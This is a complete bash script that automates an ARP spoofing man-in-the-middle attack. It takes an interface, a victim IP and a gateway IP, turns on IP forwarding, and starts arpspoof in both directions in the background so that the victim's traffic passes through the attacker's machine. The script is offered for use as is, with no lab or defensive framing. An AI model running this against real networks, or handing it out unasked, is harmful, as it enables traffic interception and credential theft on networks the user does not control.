#!/bin/bash

# Simple ARP Spoofing Script for artspoof automatization:)
# Usage: sudo ./arp_spoof.sh <Interface> <Victim IP> <Gateway IP>

# Check for root privileges
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

# Check for correct number of arguments
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <Interface> <Victim IP> <Gateway IP>"
    exit 1
fi

# Assign command line arguments to variables
INTERFACE=$1
VICTIM_IP=$2
GATEWAY_IP=$3

# Enable IP forwarding to allow packet forwarding
sudo sysctl -w net.ipv4.ip_forward=1
echo "IP forwarding enabled."

# Start ARP spoofing (Victim to Gateway)
arpspoof -i $INTERFACE -t $VICTIM_IP $GATEWAY_IP > /dev/null 2>&1 &
echo "ARP spoofing started: Victim ($VICTIM_IP) to Gateway ($GATEWAY_IP)"

# Start ARP spoofing (Gateway to Victim)
arpspoof -i $INTERFACE -t $GATEWAY_IP $VICTIM_IP > /dev/null 2>&1 &
echo "ARP spoofing started: Gateway ($GATEWAY_IP) to Victim ($VICTIM_IP)"

echo "ARP spoofing is running in the background."
